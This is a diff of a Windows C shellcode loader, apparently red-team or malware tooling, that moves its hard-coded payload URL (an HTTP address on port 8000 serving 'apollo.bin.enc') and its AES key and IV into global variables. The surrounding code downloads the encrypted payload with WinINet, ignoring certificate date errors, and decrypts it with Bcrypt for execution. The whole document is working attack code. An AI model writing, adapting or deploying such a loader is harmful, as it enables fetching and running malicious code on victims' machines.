@@ -6,10 +6,20 @@
 #pragma comment (lib, "Wininet.lib")
 #pragma comment(lib, "Bcrypt.lib")
 
-
 #define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
 #define KEYSIZE         32
 #define IVSIZE          16
+
+// Update this :)
+LPCWSTR binFile = L"http://192.168.235.130:8000/apollo.bin.enc";
+unsigned char AesKey[] = {
+        0x6B, 0x06, 0xB0, 0x63, 0xBF, 0x97, 0x4C, 0x66, 0x6B, 0x88, 0xB4, 0x99, 0x42, 0xFB, 0x5E, 0xB4,
+        0x3E, 0xEB, 0xBF, 0x38, 0xE0, 0x53, 0x94, 0xC8, 0x67, 0xDD, 0xAF, 0xFC, 0x1F, 0xE6, 0xC3, 0x44
+};
+unsigned char AesIv[] = {
+    0x47, 0x9D, 0x1D, 0xF0, 0x7C, 0xA1, 0xD2, 0x4C, 0x18, 0x55, 0xBD, 0x30, 0xAB, 0xCB, 0x9B, 0xAA
+};
+
 
 typedef struct _AES {
     PBYTE   pPlainText;             // base address of the plain text data
@@ -158,7 +168,6 @@ BOOL ShellcodeFromUrl(PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
     }
 
     // Open the handle to the shellcode specified by HTTP URL.
-    LPCWSTR binFile = L"http://192.168.235.130:8000/apollo.bin.enc";
     hInternetShellcode = InternetOpenUrlW(hInternet, binFile, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
     if (hInternetShellcode == NULL) {
         printf("InternetOpenUrlW Failed with error code: %d \n", GetLastError());
@@ -276,17 +285,7 @@ int main() {
 
     // Initializing the key and IV needed for the decryption
     PVOID	pPlaintext = NULL;
-    DWORD	dwPlainSize = NULL;
-    unsigned char AesKey[] = {
-        0x6B, 0x06, 0xB0, 0x63, 0xBF, 0x97, 0x4C, 0x66, 0x6B, 0x88, 0xB4, 0x99, 0x42, 0xFB, 0x5E, 0xB4,
-        0x3E, 0xEB, 0xBF, 0x38, 0xE0, 0x53, 0x94, 0xC8, 0x67, 0xDD, 0xAF, 0xFC, 0x1F, 0xE6, 0xC3, 0x44
-    };
-
-
-    unsigned char AesIv[] = {
-        0x47, 0x9D, 0x1D, 0xF0, 0x7C, 0xA1, 0xD2, 0x4C, 0x18, 0x55, 0xBD, 0x30, 0xAB, 0xCB, 0x9B, 0xAA
-    };
-    
+    DWORD	dwPlainSize = NULL;  
 
     // Calling the decryption function
     printf("Size %d\n", Size);
@@ -350,3 +349,4 @@ int main() {
     getchar();
     */
 }
+
